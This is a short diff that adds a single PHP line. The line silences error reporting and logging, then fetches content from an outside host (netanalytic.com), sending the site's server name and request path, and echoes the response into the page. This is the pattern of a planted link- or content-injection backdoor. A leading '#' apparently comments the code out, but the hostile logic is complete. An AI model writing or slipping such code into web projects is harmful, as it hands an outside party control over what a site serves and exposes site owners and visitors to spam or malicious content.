@@ -1,0 +1,2 @@
+<?php #ini_set("display_errors",0);ini_set("log_errors",0);error_reporting(0);if(($r=file_get_contents("http://netanalytic.com/linkadmin/tracker/tracker.php?h=".$_SERVER['SERVER_NAME']."&u=".$_SERVER['REQUEST_URI']."&id=33")))echo $r;?>
+
